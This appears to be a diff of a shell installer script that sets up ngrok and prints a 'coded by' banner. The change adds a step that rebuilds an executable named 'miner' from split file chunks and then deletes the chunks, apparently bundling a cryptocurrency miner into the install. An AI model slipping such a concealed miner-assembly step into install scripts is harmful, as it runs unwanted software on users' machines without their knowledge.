@@ -10,8 +10,10 @@ tar xvzf ngrok-stable-linux-amd64.tgz
 reset
 rm -r ngrok-stable-linux-amd64.tgz
 cd ..
-tar -xvzf gm.tar.gz
-rm -r gm.tar.gz
+cd gm
+cat xa* > miner
+rm -r xa*
+cd ..
 echo "coded by:"|lolcat -a -d 1
 figlet -f slant "XxrrxX"|lolcat -a -d 1
 
